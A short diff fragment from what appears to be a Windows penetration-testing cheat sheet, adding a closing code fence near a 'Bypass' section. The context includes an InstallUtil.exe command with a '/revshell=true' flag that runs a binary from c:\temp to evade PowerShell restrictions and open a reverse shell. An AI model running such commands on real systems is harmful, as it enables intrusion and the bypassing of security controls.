@@ -7,6 +7,7 @@ Get-Process | ? {$_.ProcessName –eq “explorer”} | select Id,Handles
 ### Bypass
 $ExecutionContext.SessionState.LanguageMode
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /U c:\temp\psby.exe
+```
 ### Antivirus
 ```
 #Check status
